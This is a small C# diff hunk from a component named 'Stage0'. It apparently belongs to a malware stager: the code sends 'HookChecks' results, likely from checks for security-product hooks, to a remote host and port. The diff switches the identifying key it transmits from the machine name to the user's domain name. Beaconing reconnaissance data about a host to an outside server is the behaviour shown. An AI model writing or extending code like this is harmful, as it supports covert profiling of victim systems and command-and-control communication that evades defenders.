@@ -91,7 +91,8 @@ namespace Stage0
 
             string data = BitConverter.ToString(HookChecks);
             //data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-            byte[] key = Encoding.UTF8.GetBytes("KEY:"+Environment.MachineName);
+            //byte[] key = Encoding.UTF8.GetBytes("KEY:"+Environment.MachineName);
+            byte[] key = Encoding.UTF8.GetBytes("KEY:" + Environment.UserDomainName);
             SendData(_host, Convert.ToInt32(_port), key);
             SendData(_host, Convert.ToInt32(_port), HookChecks);
         }
